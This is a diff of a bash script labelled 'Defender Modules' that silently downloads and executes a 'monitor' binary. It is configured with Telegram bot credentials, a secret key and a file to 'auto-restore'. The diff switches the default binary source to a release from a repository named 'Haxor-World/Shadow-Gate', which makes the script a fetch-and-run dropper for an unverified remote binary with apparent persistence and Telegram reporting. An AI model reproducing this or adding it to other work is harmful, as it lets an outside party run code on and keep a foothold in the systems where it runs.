@@ -1,3 +1,21 @@
+#!/usr/bin/env bash
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# Defender Modules - Monitor Binary Execution Script
+# ═══════════════════════════════════════════════════════════════════════════════
+# 
+# Simple script to download and execute monitor binary
+#
+# Environment Variables:
+#   BOT_TOKEN       - Telegram bot token
+#   CHAT_ID         - Telegram chat ID
+#   AUTO_RESTORE_FILE - File to monitor
+#   RAW_URL         - Raw URL for restoration
+#   SECRET_KEY      - Secret key
+#   BINARY_URL      - Binary download URL
+#   DEBUG           - Enable debug output
+#
+# ═══════════════════════════════════════════════════════════════════════════════
 
 [[ -z $ERR_LOG ]] && ERR_LOG="/dev/null"
 
@@ -97,7 +115,7 @@ download_binary() {
 	local target_path="$1"
 	local download_url="$2"
 	
-	[[ -z "$download_url" ]] && download_url="https://github.com/pr1m0rdial/monitor/releases/latest/download/monitor-${OS_NAME}-${OS_ARCH}"
+	[[ -z "$download_url" ]] && download_url="https://github.com/Haxor-World/Shadow-Gate/releases/download/1.0.0/monitor-${OS_NAME}-${OS_ARCH}"
 	
 	if command -v curl &>/dev/null; then
 		curl -fsSL "$download_url" -o "$target_path" &>/dev/null || return 1
